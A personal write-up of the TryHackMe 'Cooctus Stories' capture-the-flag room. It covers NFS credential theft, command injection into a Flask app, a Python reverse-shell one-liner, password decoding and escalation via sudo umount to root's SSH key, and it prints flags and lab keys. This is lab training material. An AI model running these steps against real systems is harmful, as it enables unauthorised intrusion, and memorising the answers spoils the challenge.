<h1 align="center">Cooctus Stories</h1>
<p align="center">July 28, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>448</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>This room is about the Cooctus Clan</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/997151fc-c968-4712-bd16-fe14bec4b392"><br>
Click <a href="https://tryhackme.com/room/cooctusadventures">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/31f8fbf9-df06-4204-bf3c-8a90765afa9b"></p>

<br>
<br>

<h2>Task 1 . The Story so far ...</h2>
<p>Previously on Cooctus Tracker<br>
Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened. (From Overpass 2 - Hacked by NinjaJc01)<br>

Present times<br>
Further investigation revealed that the hack was made possible by the help of an insider threat. Paradox helped the Cooctus Clan hack overpass in exchange for the secret shiba stash. Now, we have discovered a private server deep down under the boiling hot sands of the Saharan Desert. We suspect it is operated by the Clan and it's your objective to uncover their plans.<br>

Note: A stable shell is recommended, so try and SSH into users when possible.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Paradox is nomming cookies. Hint: <em>Confront the CAT!</em><br>
<code>THM{2dccd1ab3e03990aea77359831c85ca2}</code></p>

<h3>Nmap</h3>

```bash
:~/CooctusStories# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38741/tcp6  mountd
|   100005  1,2,3      39087/tcp   mountd
|   100005  1,2,3      53758/udp   mountd
|   100005  1,2,3      56909/udp6  mountd
|   100021  1,3,4      33201/tcp   nlockmgr
|   100021  1,3,4      38267/tcp6  nlockmgr
|   100021  1,3,4      44563/udp6  nlockmgr
|   100021  1,3,4      57138/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: CCHQ
33201/tcp open  nlockmgr 1-4 (RPC #100021)
39087/tcp open  mountd   1-3 (RPC #100005)
49533/tcp open  mountd   1-3 (RPC #100005)
49833/tcp open  mountd   1-3 (RPC #100005)
```

<h3>/etc/hosts</h3>

```bash
TargetIP   cooctus.thm
```

<h3>Gobuster</h3>

```bash
:~/CooctusStories# gobuster dir -u http://cooctus.thm:8080/ -w /usr/share/dirb/wordlists/common.txt -e -k -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cooctus.thm:8080/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://cooctus.thm:8080/cat                  (Status: 302) [Size: 219] [--> http://cooctus.thm:8080/login]
http://cooctus.thm:8080/login                (Status: 200) [Size: 556]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

<h3>Mount</h3>

```bash
:~/CooctusStories# showmount -e TargetIP
Export list for TargetIP:
/var/nfs/general *
```

```bash
:~/CooctusStories# mkdir /mnt/nfs
:~/CooctusStories# sudo mount TargetIP:/var/nfs/general /mnt/nfs
```

```bash
:~/CooctusStories/mnt/nfs# ls
credentials.bak
```

```bash
:~/CooctusStories/mnt/nfs# file credentials.bak
credentials.bak: ASCII text
```

```bash
:~/CooctusStories/mnt/nfs# cat credentials.bak
paradoxial.test
ShibaPretzel79
```

<h3>Web</h3>

<img width="1058" height="511" alt="image" src="https://github.com/user-attachments/assets/b89444de-5d60-498b-8fbe-512e238c0446" />

<img width="1070" height="210" alt="image" src="https://github.com/user-attachments/assets/ec42ce33-2e93-40d7-8b4b-8789f143defe" />


```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.238.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

<img width="1060" height="286" alt="image" src="https://github.com/user-attachments/assets/c4a58f3f-9cef-4201-914e-54f4bd393442" />


```bash
:~/CooctusStories/mnt/nfs# nc -nlvp 4444
...
paradox@cchq:~$ pwd
pwd
/home/paradox
paradox@cchq:~$ ls
ls
CATapp  user.txt
paradox@cchq:~$ cat user.txt
cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}
```

<br>

<p>1.2. Find out what Szymex is working on. Hint: <em>Locating shipment...</em><br>
<code>THM{c89f9f4ef264e22001f9a9c3d72992ef}</code></p>

```bash
paradox@cchq:~$ cd CATapp
cd CATapp
paradox@cchq:~/CATapp$ ls
ls
app.py  static  templates
paradox@cchq:~/CATapp$ cat app.py
cat app.py
#!/usr/bin/python3

from flask import Flask, render_template, redirect, url_for, request
import os
import shlex
import subprocess

app = Flask(__name__)

global logged_in
logged_in = False

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=['GET', 'POST'])
def login():
    global logged_in
    error = None
    if request.method == "POST":
        if request.form['username'] != 'paradoxial.test' or request.form['password'] != 'ShibaPretzel79':
            error = 'No enter for you >:('
        else:
            logged_in = True
            return redirect(url_for('cat'))
    
    return render_template("login.html", error = error)

@app.route("/cat", methods=['GET', 'POST'])
def cat():
    global logged_in
    if not logged_in:
        return redirect(url_for("login"))
    error = None
    if request.method == "POST":
        payload = request.form['payload']
        os.system(payload)
        #return request.form['payload']
        return payload
    return render_template("cat.html", error=error)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=8080)
```

```bash
paradox@cchq:~$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * * 	szymex	/home/szymex/SniffingCat.py
#
```

```bash
paradox@cchq:~$ cat /home/szymex/SniffingCat.py
cat /home/szymex/SniffingCat.py
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
```

```bash
paradox@cchq:~$ ls -la /home/szymex/mysupersecretpassword.cat
ls -la /home/szymex/mysupersecretpassword.cat
-r-------- 1 szymex szymex 11 Jan  2  2021 /home/szymex/mysupersecretpassword.cat
```


```bash
paradox@cchq:~$ ls -lah /home/szymex/
ls -lah /home/szymex/
total 44K
drwxr-xr-x 5 szymex szymex 4.0K Feb 22  2021 .
drwxr-xr-x 6 root   root   4.0K Jan  2  2021 ..
lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
-rw-r--r-- 1 szymex szymex 3.8K Feb 20  2021 .bashrc
drwx------ 2 szymex szymex 4.0K Jan  2  2021 .cache
drwx------ 3 szymex szymex 4.0K Jan  2  2021 .gnupg
drwxrwxr-x 3 szymex szymex 4.0K Jan  2  2021 .local
-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
-rw------- 1 szymex szymex   38 Feb 22  2021 user.txt
```


```bash
paradox@cchq:~$ cat /home/szymex/note_to_para
cat /home/szymex/note_to_para
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
```

```bash
:~/CooctusStories# ls
id_rsa  id_rsa.pub
```

```bash
paradox@cchq:~$ cd .ssh
cd .ssh
paradox@cchq:~/.ssh$ echo "....." > authorized_keys 
```

```bash
:~/CooctusStories# ssh -i id_rsa paradox@TargetIP
...
paradox@cchq:~$
```

```bash
:~/CooctusStories# cat script.py 
#!/usr/bin/python3

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

s = 'abcdefghijklmnopqrstuvwxyz'
clear = list(s)
encoded = list(encode(s))

pwd = "pureelpbxr"
dec = ""

for i in pwd:
    dec += clear[encoded.index(i)]

print(dec)
```

```bash
:~/CooctusStories# python3 script.py
cherrycoke
```

```bash
paradox@cchq:~$ su szymex
Password: 
```


```bash
szymex@cchq:~$ ls -la
total 44
drwxr-xr-x 5 szymex szymex 4096 Feb 22  2021 .
drwxr-xr-x 6 root   root   4096 Jan  2  2021 ..
lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
-rw-r--r-- 1 szymex szymex 3865 Feb 20  2021 .bashrc
drwx------ 2 szymex szymex 4096 Jan  2  2021 .cache
drwx------ 3 szymex szymex 4096 Jan  2  2021 .gnupg
drwxrwxr-x 3 szymex szymex 4096 Jan  2  2021 .local
-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
-rw------- 1 szymex szymex   38 Feb 22  2021 user.txt
szymex@cchq:~$ cat user.txt
THM{c89f9f4ef264e22001f9a9c3d72992ef}
```

<br>

<p>1.3. Find out what Tux is working on. Hint: <em>Combine and crack</em><br>
<code>THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}</code></p>



```bash
zymex@cchq:~$ cd ..
szymex@cchq:/home$ cd tux
szymex@cchq:/home/tux$ ls -lah
total 56K
drwxr-xr-x 9 tux  tux     4.0K Feb 20  2021 .
drwxr-xr-x 6 root root    4.0K Jan  2  2021 ..
lrwxrwxrwx 1 tux  tux        9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tux  tux      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tux  tux     3.7K Feb 20  2021 .bashrc
drwx------ 3 tux  tux     4.0K Nov 21  2020 .cache
drwx------ 4 tux  tux     4.0K Feb 20  2021 .config
drwx------ 5 tux  tux     4.0K Feb 20  2021 .gnupg
-rw------- 1 tux  tux       58 Feb 20  2021 .lesshst
drwx------ 5 tux  tux     4.0K Jan  2  2021 .local
-rw-rw-r-- 1 tux  tux      630 Jan  2  2021 note_to_every_cooctus
drwx------ 2 tux  tux     4.0K Feb 20  2021 .ssh
-rw-r--r-- 1 tux  tux        0 Feb 20  2021 .sudo_as_admin_successful
drwxrwx--- 2 tux  testers 4.0K Feb 20  2021 tuxling_1
drwxrwx--- 2 tux  testers 4.0K Feb 20  2021 tuxling_3
-rw------- 1 tux  tux       38 Feb 20  2021 user.txt
```

```bash
szymex@cchq:/home/tux$ cat note_to_every_cooctus
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer
```

```bash
szymex@cchq:/home/tux$ cd tuxling_1
szymex@cchq:/home/tux/tuxling_1$ ls
nootcode.c  note
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
```


```bash
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
```

```bash
szymex@cchq:/home/tux/tuxling_1$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/CooctusStories# wget http://10.10.202.20:8000/nootcode.c
```

```bash
:~/CooctusStories# gcc nootcode.c -o nootcode
nootcode.c: In function \u2018main\u2019:
nootcode.c:10:15: warning: implicit declaration of function \u2018nuut\u2019; did you mean \u2018nout\u2019? [-Wimplicit-function-declaration]
   10 | #define Nooot nuut
      |               ^~~~
nootcode.c:24:5: note: in expansion of macro \u2018Nooot\u2019
   24 |     Nooot noOt nooT NooT
      |     ^~~~~
nootcode.c: At top level:
nootcode.c:10:15: warning: conflicting types for \u2018nuut\u2019
   10 | #define Nooot nuut
      |               ^~~~
nootcode.c:33:6: note: in expansion of macro \u2018Nooot\u2019
   33 | NOOt Nooot noOt nooT NOot
      |      ^~~~~
nootcode.c:10:15: note: previous implicit declaration of \u2018nuut\u2019 was here
   10 | #define Nooot nuut
      |               ^~~~
nootcode.c:24:5: note: in expansion of macro \u2018Nooot\u2019
   24 |     Nooot noOt nooT NooT
      |     ^~~~~
```

```bash
:~/CooctusStories# rabin2 -z nootcode
[Strings]
nth paddr      vaddr      len size section type  string
\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015
0   0x00002004 0x00002004 26  27   .rodata ascii What does the penguin say?
1   0x0000201f 0x0000201f 10  11   .rodata ascii f96050ad61
2   0x0000202a 0x0000202a 5   6    .rodata ascii NOOT!
```

<p>First fragment = <code>f96050ad61</code></p>

```bash
szymex@cchq:/home/tux$ ls
note_to_every_cooctus  tuxling_1  tuxling_3  user.txt
szymex@cchq:/home/tux$ cd tuxling_3
szymex@cchq:/home/tux/tuxling_3$ ls -lah
total 12K
drwxrwx--- 2 tux testers 4.0K Feb 20  2021 .
drwxr-xr-x 9 tux tux     4.0K Feb 20  2021 ..
-rwxrwx--- 1 tux testers  178 Feb 20  2021 note
szymex@cchq:/home/tux/tuxling_3$ cat note
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.
```

<p>Last fragment = <code>637b56db1552</code></p>

```bash
szymex@cchq:/home/tux$ find / -type d -name "tuxling*" 2>/dev/null
/home/tux/tuxling_3
/home/tux/tuxling_1
/media/tuxling_2
```


```bash
szymex@cchq:/home/tux$ cd /media
szymex@cchq:/media$ ls
tuxling_2
szymex@cchq:/media$ cd tuxling_2
szymex@cchq:/media/tuxling_2$ ls
fragment.asc  note  private.key
```


```bash
szymex@cchq:/media/tuxling_2$ cat note
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!
```

```bash
szymex@cchq:/media/tuxling_2$ cat fragment.asc
-----BEGIN PGP MESSAGE-----

hQGMA5fUjrF1Eab6AQv/Vcs2Y6xyn5aXZfSCjCwKT1wxBgOcx2MBeat0wtAsYzkF
J6nWV3nBUyA2tXUBAHsr5iZnsuXubsG6d5th7z5UO8+1MS424I3Rgy/969qyfshj
...
P72PMvolHYd461j62+uv0mQBTQhH5STUWq6OtHlHgbrnSJvGNll3WZ5BfCiE2O1C
8+UXEfCw05QMZgE2dePneZdWISNUkGTTVji9atq3l4b0vbHihNdwTTMfla8+arPs
eA0RkdEXuoYWvOpocvlU5XuTcCdy
=GDIs
-----END PGP MESSAGE-----
```

```bash
szymex@cchq:/media/tuxling_2$ gpg --import private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

```bash
szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d
```

<p>Second fragment = <code>6eaf62818d</code></p>

<p>= <code>f96050ad616eaf62818d637b56db1552</code></p>

<img width="1332" height="527" alt="image" src="https://github.com/user-attachments/assets/63294bd8-fbf6-4d29-a800-b35582f8acf7" />

<p><code>tuxykitty</code></p>

```bash
szymex@cchq:/media/tuxling_2$ su tux
Password: 
tux@cchq:/media/tuxling_2$ cd /home/tux
tux@cchq:~$ ls
note_to_every_cooctus  tuxling_1  tuxling_3  user.txt
tux@cchq:~$ cat user.txt
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
```

<br>

<p>1.4. Find out what Varg is working on. Hint: <em>Boot sequence initiated...</em><br>
<code>THM{3a33063a4a8a5805d17aa411a53286e6}</code></p>

```bash
tux@cchq:~$ sudo -l
Matching Defaults entries for tux on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tux may run the following commands on cchq:
    (varg) NOPASSWD: /home/varg/CooctOS.py
```


```bash
tux@cchq:/home/varg$ ls -lah
total 48K
drwxr-xr-x  7 varg varg      4.0K Feb 20  2021 .
drwxr-xr-x  6 root root      4.0K Jan  2  2021 ..
lrwxrwxrwx  1 varg varg         9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 varg varg       220 Jan  2  2021 .bash_logout
-rw-r--r--  1 varg varg      3.7K Jan  3  2021 .bashrc
drwx------  2 varg varg      4.0K Jan  3  2021 .cache
-rwsrws--x  1 varg varg      2.1K Feb 20  2021 CooctOS.py
drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 cooctOS_src
-rw-rw-r--  1 varg varg        47 Feb 20  2021 .gitconfig
drwx------  3 varg varg      4.0K Jan  3  2021 .gnupg
drwxrwxr-x  3 varg varg      4.0K Jan  3  2021 .local
drwx------  2 varg varg      4.0K Feb 20  2021 .ssh
-rw-------  1 varg varg        38 Feb 20  2021 user.txt
tux@cchq:/home/varg$ cd cooctOS_src
tux@cchq:/home/varg/cooctOS_src$ ls
bin  boot  etc  games  lib  run  tmp  var
tux@cchq:/home/varg/cooctOS_src$ ll
total 44
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 ./
drwxr-xr-x  7 varg varg      4096 Feb 20  2021 ../
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin/
drwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 games/
drwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git/
drwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib/
drwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp/
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var/
```

```bash
tux@cchq:/home/varg/cooctOS_src$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
@@ -1,52 +0,0 @@
...
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
-
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
-            os.setgid(1002)
-            pty.spawn("/bin/rbash")
-            break
-        else:
-            print("Login Failed")
```



```bash
tux@cchq:/home/varg/cooctOS_src$ su varg
Password: 
varg@cchq:~/cooctOS_src$ 
```

```bash
varg@cchq:~/cooctOS_src$ pwd
/home/varg/cooctOS_src
varg@cchq:~/cooctOS_src$ cd /home/varg
varg@cchq:~$ ls
CooctOS.py  cooctOS_src  user.txt
varg@cchq:~$ cat user.txt
THM{3a33063a4a8a5805d17aa411a53286e6}
```

<br>

<p>1.5. Get full root privileges. Hint: <em>To mount or not to mount. That is the question.</em><br>
<code>THM{H4CK3D_BY_C00CTUS_CL4N}</code></p>

```bash
varg@cchq:~$ sudo -l
Matching Defaults entries for varg on cchq:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User varg may run the following commands on cchq:
    (root) NOPASSWD: /bin/umount
```

```bash
varg@cchq:~$ cd /opt
varg@cchq:/opt$ ls
CooctFS
varg@cchq:/opt$ cd CooctFS
varg@cchq:/opt/CooctFS$ ls
bin  boot  etc  games  lib  run  tmp  var
varg@cchq:/opt/CooctFS$ ll
total 44
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 ./
drwxr-xr-x  3 root root      4096 Feb 20  2021 ../
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin/
drwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 games/
drwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git/
drwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib/
drwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run/
drwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp/
drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var/
```
<br>
<br>

```bash
varg@cchq:~$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo	/	ext4	defaults	0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3	/boot	ext4	defaults	0 0
#/swap.img	none	swap	sw	0 0
/home/varg/cooctOS_src	/opt/CooctFS	none	defaults,bind	0 0
```

<p>or</p>

```bash
varg@cchq:~$ df -ha | grep opt
/dev/mapper/ubuntu--vg-ubuntu--lv   19G  6.6G   12G  38% /opt/CooctFS
```

<br>
<br>

```bash
varg@cchq:/opt$ sudo /bin/umount /opt/CooctFS
varg@cchq:/opt$ cd CooctFS
varg@cchq:/opt/CooctFS$ ls
root
varg@cchq:/opt/CooctFS$ cd root
varg@cchq:/opt/CooctFS/root$ ll
total 28
drwxr-xr-x 5 root root 4096 Feb 20  2021 ./
drwxr-xr-x 3 root root 4096 Feb 20  2021 ../
lrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Feb 20  2021 .bashrc
drwx------ 3 root root 4096 Feb 20  2021 .cache/
drwxr-xr-x 3 root root 4096 Feb 20  2021 .local/
-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
drwxr-xr-x 2 root root 4096 Feb 20  2021 .ssh/
```


```bash
varg@cchq:/opt/CooctFS/root$ cat root.txt
hmmm...
No flag here. You aren't root yet.
```

```bash
varg@cchq:/opt/CooctFS/root/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
9lVwzN4eat2QPnK0BbG3gjhLjpN0ztp0LrQI1SCwBJXSwr5H8u2eU25XVVmmEvdY
+n9+v+Mon2Ne7vCobNjv4MMzXal50BlwlhNtwgwt1aWgNOyPhQFE6ceg4lGEWOUq
Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
wVa9ra/AVgxihvLLZsIwAF764Tze8XDpD8ysVnBlEYGHZeeePfkeua4jrY+U/E1k
xT6Cfsf9/Vf6Haeu7Yurxd7jQu7BAgVba+ZQi6vuofPCgVeSFQWIMgOH4+MxJgpP
Qg76sZ/SATajqraclVYa5X8FmO5bF1MEqFLtszsGR0QDgY21o0DSaeou5F1WRPJ6
Q8EogxMj2G393BrlZfdoL4j/3iZoEwFwEtMc9SX435bnxcEnv+x4lDmC1MRY1TgZ
fx558Lswfnz5FIl1HCHIVvOKnTFq16O7fAoCldVDCaRr+SDbOk71UDxcQN2SgMDH
...
sE8TgrK8iUylI741fYrB2CG/OjvH5vsZ2e5UjecCgYBGjATGDhYdzo5AxV2Kqg8i
9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
DtSizek3jVNC9k5VpJSxjQKBgQDNS0uf/6aA8yrLlxICOWzxF23L0xviSywLPLux
euV/osrmDPlY9jr/VF4f2/tpA3jjeMOAslSGsVkVUmFEpImwjNSTe4o9aTM4JIYX
3zTL7Qx+VG+VG2dqnDn0jplAY6WXs7FoKSa7ijeIZmwf/aj7vLUHllI9Dk3IprLL
gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
-----END RSA PRIVATE KEY-----
```


```bash
:~/CooctusStories# nano id_rsa
```

```bash
:~/CooctusStories# chmod 400 id_rsa
```

```bash
:~/CooctusStories# ssh -i id_rsa root@cooctus.thm
...
```

```bash
root@cchq:~# pwd
/root
root@cchq:~# ls
root.txt
root@cchq:~# cat root.txt
THM{H4CK3D_BY_C00CTUS_CL4N}
```

<br>

<h2>Task 2 . Credits</h2>
<p>First of all thank you for checking out my room! It took me way too long to put together so I hope you had some fun.<br>

Also thanks to these wonderful people:<br>

